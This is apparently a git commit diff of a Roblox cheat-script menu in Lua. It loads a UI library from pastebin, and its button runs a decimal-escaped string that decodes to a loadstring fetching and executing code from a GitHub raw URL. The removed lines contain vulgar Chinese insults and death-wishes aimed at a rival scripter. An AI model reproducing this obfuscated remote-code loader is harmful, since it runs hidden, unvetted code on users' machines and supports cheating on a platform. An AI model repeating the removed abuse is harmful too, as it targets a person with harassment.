14f388ebfda41678c7c276a0dfe64dbdfa498079
dkfkfkfjfkfjdj <137012416+dkfkfkfjfkfjdj@users.noreply.github.com>
2023-07-30 21:56:32 +0800

    Add files via upload

--- 混淆文件.lua
+++ 混淆文件.lua
@@ -1,13 +1,13 @@
 local OrionLib = loadstring(game:HttpGet("https://pastebin.com/raw/nJJPrp2w"))()
-local Window = OrionLib:MakeWindow({Name = "迷你大蛇 你妈死了 我操你血吗 ", HidePremium = false, IntroText = "你妈死了 "})
+local Window = OrionLib:MakeWindow({Name = "暴龙以后就管理这个脚本明天恢复", HidePremium = false, IntroText = "暴龙通知"})
 
 local Tab = Window:MakeTab({
-    Name = "迷你大蛇 你妈死了 ",
+    Name = "小天被下了七天极暴代替",
     Icon = "rbxassetid://4483345998",
     PremiumOnly = false
 })
 Tab:AddButton({
-    Name = "傻逼迷你大神全家死了孩子操你血吗",
+    Name = "暴龙跟大家说句话小天脚本由我管理",
 	Callback = function()
 	getgenv().long = "龙脚本，加载时间长请耐心"loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\121\121\97\105\110\105\47\108\111\110\47\109\97\105\110\47\108\105\115\119\109\34\41\41\40\41")()
 	end
